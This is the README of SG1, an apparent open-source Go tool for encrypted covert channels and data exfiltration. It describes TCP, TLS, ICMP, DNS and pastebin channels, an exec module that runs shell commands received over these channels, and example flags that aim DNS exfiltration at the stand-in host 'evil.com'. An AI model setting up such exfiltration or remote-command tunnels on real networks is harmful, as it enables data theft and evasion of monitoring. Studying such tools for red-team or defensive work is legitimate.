# SG1

```
                                                _______                                
                                        _,.--==###\_/=###=-.._                         
                                    ..-'     _.--\\_//---.    `-..                     
                                 ./'    ,--''     \_/     `---.   `\.                  
                               ./ \ .,-'      _,,......__      `-. / \.                
                             /`. ./\'    _,.--'':_:'"`:'`-..._    /\. .'\              
                            /  .'`./   ,-':":._.:":._.:"+._.:`:.  \.'`.  `.            
                          ,'  //    .-''"`:_:'"`:_:'"`:_:'"`:_:'`.     \   \           
                         /   ,'    /'":._.:":._.:":._.:":._.:":._.`.    `.  \          
                        /   /    ,'`:_:'"`:_:'"`:_:'"`:_:'"`:_:'"`:_\     \  \         
                       ,\\ ;     /_.:":._.:":._.:":._.:":._.:":._.:":\     ://,        
                       / \\     /'"`:_:'"`:_:'"`:_:'"`:_:'"`:_:'"`:_:'\    // \.       
                      |//_ \   ':._.:":._.+":._.:":._.:":._.:":._.:":._\  / _\\ \      
                     /___../  /_:'"`:_:'"`:_:'"`:_:'"`:_:'"`:_:'"`:_:'"'. \..__ |      
                      |  |    '":._.:":._.:":._.:":._.:":._.:":._.:":._.|    |  |      
                      |  |    |-:'"`:_:'"`:_:'"`:_:'"`:_:'"`:_:'"`:_:'"`|    |  |      
                      |  |    |":._.:":._.:":._.:":._.:":._.+":._.:":._.|    |  |      
                      |  :    |_:'"`:_:'"`:_+'"`:_:'"`:_:'"`:_:'"`:_:'"`|    ; |       
                      |   \   \.:._.:":._.:":._.:":._.:":._.:":._.:":._|    /  |       
                       \   :   \:'"`:_:'"`:_:'"`:_:'"`:_:'"`:_:'"`:_:'.'   ;  |        
                        \  :    \._.:":._.:":._.:":._.:":._.:":._.:":,'    ;  /        
                        `.  \    \..--:'"`:_:'"`:_:'"`:_:'"`:_:'"`-../    /  /         
                         `__.`.'' _..+'._.:":._.:":._.:":._.:":.`+._  `-,:__`          
                      .-''    _ -' .'| _________________________ |`.`-.     `-.._      
                _____'   _..-|| :.' .+/;;';`;`;;:`)+(':;;';',`\;\|. `,'|`-.      `_____
                  MJP .-'   .'.'  :- ,'/,',','/ /./|\.\ \`,`,-,`.`. : `||-.`-._        
                          .' ||.-' ,','/,' / / / + : + \ \ \ `,\ \ `.`-||  `.  `-.     
                       .-'   |'  _','<', ,' / / // | \\ \ \ `, ,`.`. `. `.   `-.       
                                                   :              - `. `.              
                                            BECAUSE
                                                   REASONS      
```

SG1 is a wanna be swiss army knife for data encryption, exfiltration and covert communication. In its core `sg1` aims to be as simple to use as `nc` while maintaining high modularity internally, being a framework for bizarre exfiltration, data manipulation and transfer methods.

Have you ever thought to have your chats or data transfers tunneled through encrypted, private and self deleting pastebins? What about sending that stuff to some dns client -> dns server bridge? Then TLS maybe? :D

**WORK IN PROGRESS, DON'T JUDGE** 

[![Go Report Card](https://goreportcard.com/badge/github.com/evilsocket/sg1)](https://goreportcard.com/report/github.com/evilsocket/sg1)

## The Plan

- [x] Working utility to move data in one direction only ( `input channel` -> `module/raw` -> `output channel` ).
- [ ] Bidirectional communication, aka moving from the concept of `channel` to `tunnel`. ( work in progress, each tunnel object should derive from [net.Conn](https://golang.org/pkg/net/#Conn) in order to use the Pipe method )
- [ ] SOCKS5 tunnel implementation, once done sg1 can be used for browsing and tunneling arbitrary TCP communications.
- [ ] Implement `sg1 -probe server-ip-here` and `sg1 -discover 0.0.0.0` commands, the sg1 client will use every possible channel to connect to the sg1 server and create a tunnel.
- [ ] Deployment with `sg1 -deploy` command, with "deploy tunnels" like `-deploy ssh:user:password@host:/path/` (deploy tunnels can be obfuscated as well).
- [ ] Orchestrator `sg1 -orchestrate config.json` to create a randomized and encrypted exfiltration chain of tunnels in a TOR-like network.

## Installation

Make sure you have at least **go 1.8** in order to build `sg1`, then:

    go get github.com/miekg/dns
    go get github.com/evilsocket/sg1

    cd $GOPATH/src/github.com/evilsocket/sg1/
    make

If you want to build for a different OS and / or architecture, you can instead do:

    GOOS=windows GOARCH=386 make

After compilation, you will find the `sg1` binary inside the `build` folder, you can start with taking a look at the help menu:

    ./build/sg1 -h

## Contribute

0) Read the code, love the code, fix the code.
1) Check `The Plan` section of this README and see what you can do.
2) Grep for `TODO` and see how you can help.
3) Implement a new module ( see `modules/raw.go` for very basic example or `modules/aes.go` for complete one ).
4) Implement a new channel ( see `channels/*.go` ).
5) Write tests, because I'm a lazy s--t.

## Features

The main `sg1` operation logic is:

    while input.has_data() {
        data = input.read()
        results = module.process(data)
        output.write(data)
    }

Keep in mind that modules and channels can be piped one to another, just use `sg1 -h` to see a list of available channels and modules, try to pipe them and see what happens ^_^

### Modules

**raw** 

The default mode, will read from input and write to output.

**base64**

Will read from input, encode in base64 and write to output.

**aes** 

Will read from input, encrypt or decrypt (depending on `--aes-mode` parameter, which is `encrypt` by default) with `--aes-key` and write to output.

Examples:

    -module aes --aes-key y0urp4ssw0rd
    -module aes -aes-module decrypt --aes-key y0urp4ssw0rd

**exec**

Will read from input, execute as a shell command and pipe to output.

### Channels

**console**

The default channel, stdin or stdout depending on the direction.

**tcp** 

A tcp server (if used as input) or client (as output).

Examples:

    -in tcp:0.0.0.0:10000
    -out tcp:192.168.1.2:10000

**tls**

A tls tcp server (if used as input) or client (as output), it will automatically generate the key pair or load them via `--tls-pem` and `--tls-key` optional parameters.

Examples:

    -in tls:0.0.0.0:10003
    -out tls:192.168.1.2:10003

**icmp** 

If used as output, data will be chunked and sent as ICMP echo packets, as input an ICMP listener will be started decoding those packets.

Examples:

    -in icmp:0.0.0.0
    -out icmp:192.168.1.2

**dns** 

If used as output, data will be chunked and sent as DNS requests, as input a DNS server will be started decoding those requests. The accepted syntaxes are:

    dns:domain.tld@resolver:port

In which case, DNS requests will be performed (or decoded) for subdomains of `domain.tld`, sent to the `resolver` ip address on `port`.

    dns:domain.tld

DNS requests will be performed (or decoded) for subdomains of `domain.tld` using default system resolver.

    dns

DNS requests will be performed (or decode) for subdomains of `google.com` using default system resolver.

Examples:

    -in dns:evil.com@0.0.0.0:10053
    -out dns:evil.com@192.168.1.2:10053
    -out dns:evil.com

**pastebin**

If used as output, data will be chunked and sent to pastebin.com as private pastes, as input a pastebin listener will be started decoding those pastes.

Examples:

    -in pastebin:YOUR-API-KEY/YOUR-USER-KEY
    -out pastebin:YOUR-API-KEY/YOUR-USER-KEY

[This](https://pastebin.com/api#8 ) is how you can retrieve your user key given your api key.

## Examples

In the following examples you will always see 127.0.0.1, but that can be any ip, the tool is tunnelling data locally as a PoC but it also works among different computers on any network (as shown by one of the pictures).

--

TLS client -> server session (if no `--tls-pem` or `--tls-key` arguments are specified, a self signed certificate will be automatically generated by sg1):
![tls](https://pbs.twimg.com/media/DPPSi8KW4AIVDVo.jpg:large)

Simple file exfiltration over DNS:
![file](https://pbs.twimg.com/media/DPH8KkAWsAE5rZZ.jpg:large)

Quick and dirty AES encrypted chat over TCP:
![aes-tcp](https://pbs.twimg.com/media/DPHAlOXWAAA9kKv.jpg:large)

Or over ICMP:
![icmp](https://pbs.twimg.com/media/DPfJ--aWsAEng-y.jpg:large)

Pastebin AES encrypted data tunnel with self deleting private pastes:
![pastebin](https://pbs.twimg.com/media/DPQl7zoXUAAIdQ9.jpg:large)

Encrypting data in AES and exfiltrate it via DNS requests:
![aes-dns](https://pbs.twimg.com/media/DPHsSLwWkAEbg7P.jpg:large)

Executing commands encoded and sent via DNS requests:
![exec](https://pbs.twimg.com/media/DPKgERnX0AEKuJn.jpg:large)

Use several machines to create exfiltration tunnels ( tls -> dns -> command execution -> tcp ):
![tunnel](https://pbs.twimg.com/media/DPPhxAnX4AI7UUV.jpg:large)

Test with different operating systems ( tnx to [decoded](https://twitter.com/d3d0c3d) ):
![freebsd](https://pbs.twimg.com/media/DPH0612UQAA3gzg.jpg:large)

With bouncing to another host:
![bounce](https://pbs.twimg.com/media/DPHtBocWsAAyDVN.jpg:large)

Some `stdin` -> `dns packets` -> `pastebin temporary paste` -> `stdout` hops:
![hops](https://pbs.twimg.com/media/DPQ58EhW0AA7CFz.jpg:large)

## License

SG1 was made with ♥  by [Simone Margaritelli](https://www.evilsocket.net/) and it's released under the GPL 3 license.

